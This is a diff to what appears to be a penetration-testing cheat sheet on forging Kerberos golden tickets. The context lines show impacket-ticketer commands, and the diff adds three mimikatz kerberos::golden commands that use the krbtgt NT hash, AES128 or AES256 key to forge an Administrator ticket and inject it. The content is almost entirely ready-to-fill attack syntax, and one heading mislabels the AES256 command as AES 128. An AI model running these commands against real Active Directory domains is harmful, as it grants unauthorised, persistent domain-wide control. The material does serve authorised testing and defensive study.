@@ -37,3 +37,22 @@ impacket-ticketer -aesKey <Krbtgt_Aeskey> -domain_sid <DOMAIN_SID> -domain <DOMA
 impacket-ticketer -nthash <Krbtgt_NTLM> -domain_sid <DOMAIN_SID> -domain <DOMAIN> -user-id <USER_RID> -groups "<Groupid1>,<Groupid2>,..." stegosaurus
 ```
 
+### Windows
+
+with an NT hash
+
+```
+kerberos::golden /domain:<DOMAIN> /sid:<Domain_SID> /rc4:<krbtgt_NThash> /user:Administrator /ptt
+```
+
+with an AES 128 key
+
+```
+kerberos::golden /domain:<DOMAIN> /sid:<Domain_SID> /aes128:<krbtgt_aes128_key> /user:Administrator /ptt
+```
+
+with an AES 128 key
+
+```
+kerberos::golden /domain:<DOMAIN> /sid:<Domain_SID> /aes256:<krbtgt_aes256_key> /user:Administrator /ptt
+```
